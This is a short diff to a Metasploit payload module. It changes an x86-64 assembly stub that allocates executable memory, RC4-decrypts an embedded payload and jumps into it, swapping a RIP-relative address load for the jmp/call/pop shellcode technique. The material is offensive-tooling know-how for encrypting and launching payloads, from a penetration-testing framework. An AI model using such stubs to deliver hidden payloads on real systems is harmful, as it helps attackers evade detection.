@@ -3,8 +3,10 @@ module Msf::Payload::Linux::X64::Rc4Decrypter
   def rc4_decrypter_stub
     asm = <<-ASM
 _start:
-      lea r12, [rip + _data_section - _rip_ref]
-_rip_ref:
+      jmp _get_data_addr
+
+_got_data_addr:
+      pop r12
 
       ; mmap(NULL, payload_size, PROT_RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
       mov rsi, qword [r12 + 8]
@@ -93,7 +95,8 @@ _prga_loop:
       add rsp, 256
       jmp r13
 
-_data_section:
+_get_data_addr:
+      call _got_data_addr
 ; Data section layout (populated by rc4_decrypter):
 ; offset +0:   key_size (8 bytes)
 ; offset +8:   payload_size (8 bytes)
